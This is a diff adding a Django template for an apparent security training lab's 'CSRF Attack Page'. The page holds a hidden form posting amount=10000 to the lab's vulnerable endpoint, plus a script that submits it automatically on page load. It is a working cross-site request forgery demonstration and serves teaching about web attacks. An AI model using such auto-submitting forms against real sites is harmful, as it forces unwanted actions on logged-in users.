@@ -1,0 +1,18 @@
+{% extends 'base.html' %}
+
+{% block content %}
+
+<h2>⚠️ CSRF Attack Page</h2>
+
+<p>If you are logged in, this page will silently send a request...</p>
+
+<form id="attackForm" action="/attack_lab/csrf/vulnerable/" method="POST">
+    <input type="hidden" name="amount" value="10000">
+</form>
+
+<script>
+    // Автоматически отправляем форму
+    document.getElementById("attackForm").submit();
+</script>
+
+{% endblock %}
